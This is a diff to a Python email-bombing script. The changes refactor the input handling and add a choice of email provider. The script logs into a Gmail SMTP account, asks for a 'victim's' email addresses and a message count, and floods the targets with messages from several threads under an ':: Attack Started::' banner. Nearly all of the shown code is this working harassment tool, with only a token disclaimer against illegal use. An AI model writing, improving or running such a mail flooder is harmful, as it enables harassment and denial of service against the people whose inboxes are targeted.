@@ -41,6 +41,15 @@ class Colors:
 
 
 def main():
+    def check_int(text):
+        while True:
+            try:
+                out = int(input(text))
+                return out
+
+            except ValueError:
+                Errors.number()
+
     def red(text):
         return Colors.RED + text + Colors.ENDC
 
@@ -61,12 +70,26 @@ def main():
         def number():
             red("Please submit a number!")
 
-    SERVER = "smtp.gmail.com"
-    PORT = 587
-    print(bold(blue("This program was created by " + __author__)))
+    arrow = blue(bold("> "))
+
+    print(bold(blue("This program was created by {}.".format(__author__))))
+    print(bold(blue("Version {}".format(__version__))))
     print(bold(red("Do not use it for illegal purposes.")))
-    account = input(green("Sender's email address (g-mail)") + blue(bold("> ")))
-    alias = input(green("Nickname") + blue(bold("> ")))
+    print("Which email provider would you like to use? \n")
+    print(bold("1) G-MAIL"))
+    print(bold("2) OUTLOOK") + " " + red("Not implemented"))
+    provider = check_int(arrow)
+
+    SERVER = ""
+    PORT = 587
+    if provider == 1:
+        SERVER = "smtp.gmail.com"
+
+    elif provider == 2:
+        SERVER = "smtp.live.com"
+
+    account = input(green("Sender's email address") + arrow)
+    alias = input(green("Nickname") + arrow)
     pw = getpass.getpass()
     print(':.: Validating e-mail :.:')
 
@@ -75,40 +98,31 @@ def main():
         SMTP.starttls()
         SMTP.login(account, pw)
         SMTP.quit()
-        valid = True
 
     except Exception as e:
         print(red("[ERR] {}".format(str(e))))
         exit()
 
-    subject = input(green("Subject") + blue(bold("> ")))
-    attachments = input(green("Path to attachment [none]") + " Separate filenames with ," + blue(bold("> ")))
+    subject = input(green("Subject") + arrow)
+    attachments = input(green("Path to attachment [none]") + " Separate filenames with ," + arrow)
 
-    while True:
-        try:
-            choice = int(input(green("Plain text(1) or HTML(2)?") + blue(bold("> "))))
-            if choice <= 1:
-                choice = 1
+    choice = check_int(green("Plain text(1) or HTML(2)?") + arrow)
+    if choice <= 1:
+        choice = 1
 
-            else:
-                choice = 2
-
-            break
-
-        except ValueError:
-            Errors.number()
+    else:
+        choice = 2
 
     text_body = ""
     html_body = ""
     while True:
         if choice == 1:
             while True:
-                msg = input(green("Body") + blue(bold("> ")))
+                msg = input(green("Body") + arrow)
                 if len(msg) >= 3:
                     if msg[-3:] == "END":
                         text_body += msg.replace("END", "")
                         text_body += "\n"
-                        break
 
                     else:
                         text_body += msg
@@ -119,6 +133,8 @@ def main():
                     text_body += msg
                     text_body += "\n"
                     continue
+
+                break
 
         elif choice == 2:
             template_check = input(green("Do you wish to use an existing HTML template? [Y/n] "))
@@ -134,7 +150,7 @@ def main():
                             print(str(counter) + ") " + template)
                             templates[counter] = template
                             counter += 1
-                    template_path = input(green("Absolute path/number of HTML template") + blue(bold("> ")))
+                    template_path = input(green("Absolute path/number of HTML template") + arrow)
 
                     while True:
                         try:
@@ -156,12 +172,11 @@ def main():
 
             else:
                 while True:
-                    msg = input(green("HTML Body") + blue(bold("> ")))
+                    msg = input(green("HTML Body") + arrow)
                     if len(msg) >= 3:
                         if msg[-3:] == "END":
                             html_body += msg.replace("END", "")
                             html_body += "<br>"
-                            break
 
                         else:
                             html_body += msg
@@ -173,19 +188,15 @@ def main():
                         html_body += "<br>"
                         continue
 
-            break
+                    break
 
-    target = input(green("Victim's email address") + blue(bold("> "))).replace(" ", "").split(",")
+        break
+
+    target = input(green("Victim's email address") + arrow).replace(" ", "").split(",")
 
     level = 0
-    while True:
-        try:
-            print(yellow("The number you input will be rounded to the nearest 10"))
-            level = int(input(green("Number of emails") + blue(bold("> "))))
-            break
-
-        except ValueError:
-            Errors.number()
+    print(yellow("The number you input will be rounded to the nearest 10"))
+    level = check_int(green("Number of emails") + arrow)
 
     def send(to, text="", html=""):
         message = MIMEMultipart('alternative')
@@ -219,6 +230,7 @@ def main():
         bar.next()
 
     bar = Bar(red(bold(":: Attack Started::")), max=level*len(target))
+    print()
     THREADS = 5
 
     def attack(to, single: bool = False):
@@ -241,9 +253,9 @@ def main():
                 time.sleep(2)
 
         else:
-            print(t)
             for i in range(level):
                 Thread(target=lambda: attack(t, single=True)).start()
+                time.sleep(2)
 
         time.sleep(2)
 
